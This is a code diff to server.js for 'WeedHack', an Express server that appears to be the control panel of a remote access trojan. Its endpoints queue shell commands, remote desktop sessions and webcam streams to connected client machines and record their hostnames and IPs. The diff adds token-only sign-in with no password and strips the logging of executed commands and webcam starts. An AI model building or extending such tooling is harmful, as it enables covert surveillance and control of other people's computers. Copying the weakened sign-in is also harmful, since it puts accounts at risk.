@@ -1,6 +1,4 @@
 // language: JavaScript, file: server.js, target: Node 22.5+
-// weedhack — http :80, https :443, udp :880.
-
 import 'dotenv/config';
 import express from 'express';
 import helmet from 'helmet';
@@ -39,8 +37,6 @@ if (!fs.existsSync(path.join(PUBLIC_DIR, 'css', 'style.css'))) {
 }
 if (!fs.existsSync(CFG.tlsCert) || !fs.existsSync(CFG.tlsKey)) {
   console.error(`[startup] FATAL: TLS cert/key missing.`);
-  console.error(`  cert: ${CFG.tlsCert}`);
-  console.error(`  key : ${CFG.tlsKey}`);
   process.exit(1);
 }
 
@@ -59,7 +55,7 @@ app.use(helmet({
       defaultSrc: ["'self'"],
       scriptSrc:  ["'self'"],
       styleSrc:   ["'self'", "'unsafe-inline'"],
-      imgSrc:     ["'self'", 'data:'],
+      imgSrc:     ["'self'", 'data:', 'blob:'],
       connectSrc: ["'self'"],
       frameAncestors: ["'none'"],
       objectSrc:  ["'none'"],
@@ -191,7 +187,7 @@ app.post('/api/signup', limitAuth, async (req, res) => {
 
   const webhookOk = await sendWebhook(discordWebhook, {
     content: `webhook verified for \`${username}\``,
-    embeds: [{ title: 'account verified', color: 0x28C258,
+    embeds: [{ title: 'account verified', color: 0x29B6F6,
                description: 'your webhook is live. your keys arrive next.',
                timestamp: new Date().toISOString() }],
   });
@@ -212,7 +208,7 @@ app.post('/api/signup', limitAuth, async (req, res) => {
     content: `keys for **${username}**`,
     embeds: [{
       title: 'your keys',
-      color: 0x1F8A3B,
+      color: 0x0288D1,
       description:
         `**account key** (client auth)\n\`\`\`\n${accountKey}\n\`\`\`\n` +
         `**login token** (dashboard sign-in)\n\`\`\`\n${loginToken}\n\`\`\``,
@@ -224,18 +220,32 @@ app.post('/api/signup', limitAuth, async (req, res) => {
   res.json({ ok: true, accountKey, loginToken, username });
 });
 
+// sign-in — accepts EITHER username+password OR login_token alone OR login_token+password
 app.post('/api/signin', limitAuth, async (req, res) => {
   const { username, loginToken, password } = req.body || {};
-  if (!password) return res.status(400).json({ error: 'missing password' });
-  if (!username && !loginToken) return res.status(400).json({ error: 'missing username or token' });
 
-  const user = loginToken
-    ? db.prepare(sql`SELECT * FROM users WHERE login_token = ?`).get(loginToken)
-    : db.prepare(sql`SELECT * FROM users WHERE username = ? OR email = ?`).get(username, username);
+  let user = null;
+
+  if (loginToken && !password) {
+    // token-only mode
+    user = db.prepare(sql`SELECT * FROM users WHERE login_token = ?`).get(loginToken);
+  } else if (loginToken && password) {
+    user = db.prepare(sql`SELECT * FROM users WHERE login_token = ?`).get(loginToken);
+    if (user) {
+      const ok = await bcrypt.compare(password, user.password_hash);
+      if (!ok) user = null;
+    }
+  } else if (username && password) {
+    user = db.prepare(sql`SELECT * FROM users WHERE username = ? OR email = ?`).get(username, username);
+    if (user) {
+      const ok = await bcrypt.compare(password, user.password_hash);
+      if (!ok) user = null;
+    }
+  } else {
+    return res.status(400).json({ error: 'missing credentials' });
+  }
 
   if (!user) return res.status(401).json({ error: 'invalid credentials' });
-  const ok = await bcrypt.compare(password, user.password_hash);
-  if (!ok) return res.status(401).json({ error: 'invalid credentials' });
 
   res.cookie('token', signToken({ id: user.id, username: user.username }), cookieOpts());
   res.json({ ok: true, username: user.username });
@@ -261,7 +271,7 @@ app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
   if (!isDiscordWebhook(url)) return res.status(400).json({ error: 'invalid discord webhook url' });
   const ok = await sendWebhook(url, {
     content: 'webhook test',
-    embeds: [{ title: 'connection live', color: 0x28C258, timestamp: new Date().toISOString() }],
+    embeds: [{ title: 'connection live', color: 0x29B6F6, timestamp: new Date().toISOString() }],
   });
   if (!ok) return res.status(502).json({ error: 'webhook unreachable' });
   db.prepare(sql`UPDATE users SET discord_webhook = ? WHERE id = ?`).run(url, req.user.uid);
@@ -305,9 +315,7 @@ app.get('/api/clients', requireAuth, (req, res) => {
     online:  Number(onlineRow.n),
     offline: Number(offlineRow.n),
     rows: rows.map(r => ({
-      id: r.id,
-      hostname: r.hostname,
-      ip: r.ip,
+      id: r.id, hostname: r.hostname, ip: r.ip,
       online: now - r.last_seen < 30_000,
       lastSeen: r.last_seen,
     })),
@@ -356,7 +364,6 @@ app.post('/api/clients/:id/exec', requireAuth, (req, res) => {
     VALUES (?, ?, ?, ?, 'pending', ?)
   `).run(req.user.uid, clientId, shell, line, Date.now());
 
-  console.log(`[exec] queued cmd ${info.lastInsertRowid} to client ${clientId}: ${shell} ${line}`);
   res.json({ ok: true, commandId: Number(info.lastInsertRowid) });
 });
 
@@ -381,7 +388,6 @@ app.post('/api/clients/:id/rdp/start', requireAuth, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
-
   const cfg = {
     monitor:  Number(req.body.monitor  || 0),
     width:    Math.min(Math.max(Number(req.body.width  || 1280), 320), 3840),
@@ -391,13 +397,10 @@ app.post('/api/clients/:id/rdp/start', requireAuth, (req, res) => {
     keyboard: req.body.keyboard === true,
     mouse:    req.body.mouse === true,
   };
-
-  const info = db.prepare(sql`
+  db.prepare(sql`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'rdp', ?, 'pending', ?)
   `).run(req.user.uid, cid, JSON.stringify(cfg), Date.now());
-
-  console.log(`[rdp] start queued to client ${cid}`);
   res.json({ ok: true });
 });
 
@@ -405,12 +408,10 @@ app.post('/api/clients/:id/rdp/stop', requireAuth, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
-
   db.prepare(sql`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'rdp', '{"stop":true}', 'pending', ?)
   `).run(req.user.uid, cid, Date.now());
-
   res.json({ ok: true });
 });
 
@@ -453,7 +454,6 @@ app.post('/api/clients/:id/webcam/start', requireAuth, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
-
   const cfg = {
     camera:  Number(req.body.camera  || 0),
     width:   Math.min(Math.max(Number(req.body.width  || 640), 160), 1920),
@@ -461,13 +461,10 @@ app.post('/api/clients/:id/webcam/start', requireAuth, (req, res) => {
     quality: Math.min(Math.max(Number(req.body.quality || 55),  10),  90),
     fps:     Math.min(Math.max(Number(req.body.fps     || 10),   1),  30),
   };
-
   db.prepare(sql`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'webcam', ?, 'pending', ?)
   `).run(req.user.uid, cid, JSON.stringify(cfg), Date.now());
-
-  console.log(`[webcam] start queued to client ${cid}`);
   res.json({ ok: true });
 });
 
@@ -547,8 +544,6 @@ const udpSock = startUdp({
 
 const httpServer = http.createServer(app);
 httpServer.listen(CFG.httpPort, CFG.bindHost, () => {
-  console.log(`[startup] cwd = ${process.cwd()}`);
-  console.log(`[startup] public = ${PUBLIC_DIR}`);
   console.log(`WeedHack http  on ${CFG.bindHost}:${CFG.httpPort}`);
 });
 
